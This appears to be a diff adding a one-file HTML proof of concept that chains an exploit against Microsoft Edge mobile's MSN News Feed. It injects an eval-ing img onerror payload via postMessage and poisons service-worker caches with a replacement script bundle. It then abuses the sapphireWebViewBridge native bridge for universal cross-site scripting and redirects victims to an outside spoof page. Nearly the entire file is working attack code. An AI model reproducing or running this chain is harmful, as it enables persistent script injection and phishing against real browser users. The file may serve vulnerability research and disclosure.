@@ -1,0 +1,167 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Edge News Feed single-file chain</title>
+<style>
+  body { font: 16px system-ui; max-width: 44rem; margin: 3rem auto; padding: 0 1rem; }
+  button { font: inherit; padding: .8rem 1.2rem; }
+  pre { white-space: pre-wrap; background: #f3f3f3; padding: 1rem; }
+</style>
+<h1>Edge News Feed single-file chain</h1>
+
+<button id="run">Arm PoC</button>
+<pre id="status">idle</pre>
+<script>
+const status = document.querySelector('#status');
+const mockUrl =
+  'https://www.msn.com/mobile/edge?ocid=emmx&edge=1&platform=Android' +
+  '&bridgeVersionInt=19&disablePrefetch=true' +
+  '&MBApp=edgeMobile&MBId=Android-19&MBAT=test';
+
+function utf8Base64(value) {
+  return btoa(unescape(encodeURIComponent(value)));
+}
+
+function msnStageProgram() {
+  return String.raw`(async()=>{
+    const FILLER='/* R9_POC_FILLER */';
+    document.title='R9_MSN_STAGE';
+
+    const swText=await fetch('/edgeMobile/service-worker.js',{cache:'reload'}).then(r=>r.text());
+    const entries=[];
+    const pattern=/"revision":"([a-f0-9]+)","url":"([^"]+)"/g;
+    let match;
+    while((match=pattern.exec(swText))){
+      entries.push(
+        'https://assets.msn.com'+
+        match[2].replace('buildNumber','latest')+
+        '?__WB_REVISION__='+match[1]
+      );
+    }
+
+    const precache=await caches.open('edgemobile-pre-V1');
+    let filled=0;
+    for(const url of entries){
+      if(!await precache.match(url)){
+        await precache.put(url,new Response(FILLER,{
+          status:200,
+          headers:{'content-type':'application/javascript','date':new Date().toUTCString()}
+        }));
+        filled++;
+      }
+    }
+
+    const registration=await navigator.serviceWorker.register(
+      '/edgeMobile/service-worker.js?bundles=latest',
+      {scope:'/mobile/edge'}
+    );
+    const worker=registration.installing||registration.waiting||registration.active;
+    if(worker && worker.state!=='activated' && worker.state!=='redundant'){
+      await new Promise((resolve,reject)=>{
+        const timer=setTimeout(()=>reject(new Error('service-worker activation timeout')),45000);
+        worker.addEventListener('statechange',()=>{
+          if(worker.state==='activated'){
+            clearTimeout(timer);
+            resolve();
+          } else if(worker.state==='redundant'){
+            clearTimeout(timer);
+            reject(new Error('service-worker install became redundant'));
+          }
+        });
+      });
+    }
+    if(worker && worker.state==='redundant') throw new Error('service-worker install failed');
+
+    const experience=[...document.scripts]
+      .map(script=>script.src)
+      .find(url=>/assets\.msn\.com\/bundles\/v1\/edgeMobile\/latest\/experience\..*\.js/.test(url));
+    if(!experience) throw new Error('experience bundle not found');
+
+    const callbackId="');document.title='R9_ONECLICK_UXSS:'+location.origin;alert(location.origin);//";
+    const bundlePayload=
+      "(()=>{"+
+      "document.title='R9_NATIVE_SOURCE:'+location.origin;"+
+      "if(!window.sapphireWebViewBridge||typeof sapphireWebViewBridge.send!=='function')return;"+
+      "const maliciousId="+JSON.stringify(callbackId)+";"+
+      "let currentProbe='',sequence=0,started=false;"+
+      "const original=sapphireWebViewBridge.$onDataReady;"+
+      "const sendSnack=(duration,id,message)=>sapphireWebViewBridge.send(JSON.stringify({scenario:'requestSnackBar',data:{data:{message:message,action:'',duration:duration}},id:id}));"+
+      "sapphireWebViewBridge.$onDataReady=function(id,data){"+
+        "if(id!==currentProbe){if(typeof original==='function')return original.apply(this,arguments);return;}"+
+        "let result={};try{result=JSON.parse(decodeURIComponent(escape(atob(data))))}catch(e){}"+
+        "if(result&&result.error){setTimeout(attempt,500);return;}"+
+        "if(started)return;started=true;"+
+        "sendSnack(20000,maliciousId,'PWNED BY BADCAT');"+
+        "setTimeout(()=>{location.href='https://ghostxsec.github.io/spoof/'},1200);"+
+      "};"+
+      "function attempt(){if(started)return;currentProbe='r9-probe-'+(++sequence);sendSnack(1,currentProbe,'');}"+
+      "attempt();"+
+      "})();";
+
+    const bundles=await caches.open('edgemobile-js-bundles-V1');
+    await bundles.put(experience,new Response(bundlePayload,{
+      status:200,
+      headers:{'content-type':'application/javascript','date':new Date().toUTCString()}
+    }));
+
+    document.title='R9_ARMED';
+    const controller=window.opener&&!window.opener.closed?window.opener:window.parent;
+    controller.postMessage({type:'r9-armed',filled,experience},'*');
+    if(window.opener&&!window.opener.closed) window.close();
+  })().catch(error=>{
+    document.title='R9_ERROR';
+    const controller=window.opener&&!window.opener.closed?window.opener:window.parent;
+    controller.postMessage({type:'r9-error',error:String(error&&error.stack||error)},'*');
+  });`;
+}
+
+function run() {
+  status.textContent = 'opening MSN stage…';
+  const stage=open(mockUrl, 'r9-msn-stage');
+  if (!stage) {
+    status.textContent = 'popup blocked';
+    return;
+  }
+
+  const program = msnStageProgram();
+  const encodedProgram = utf8Base64(program).replace(/=+$/, '');
+  const html = '</pre><img src=x data-r9=' + encodedProgram +
+    ' onerror=eval(decodeURIComponent(escape(atob(this.dataset.r9))))><!--';
+  const message = JSON.stringify({
+    scenario: 'requestToast',
+    id: 'r9-outer',
+    data: {jobId: 'r9-inner', data: {message: html}}
+  });
+
+  let attempts = 0;
+  const sender = setInterval(() => {
+    attempts++;
+    stage.postMessage(message, 'https://www.msn.com');
+    status.textContent = `waiting for MSN stage (${attempts})…`;
+    if (attempts >= 240) {
+      clearInterval(sender);
+      status.textContent = 'timed out waiting for MSN stage';
+    }
+  }, 250);
+
+  function receive(event) {
+    if (!event.data || !String(event.data.type).startsWith('r9-')) return;
+    if (event.data.type === 'r9-error') {
+      clearInterval(sender);
+      status.textContent = event.data.error;
+      return;
+    }
+    if (event.data.type === 'r9-armed') {
+      clearInterval(sender);
+      removeEventListener('message', receive);
+      status.textContent =
+        `armed ${event.data.experience}; returning to the actual previous page. `+
+        `If it is New Tab, reveal “News and more”; otherwise open a New Tab first.`;
+      setTimeout(() => history.back(), 300);
+    }
+  }
+  addEventListener('message', receive);
+}
+
+document.querySelector('#run').addEventListener('click', run);
+</script>
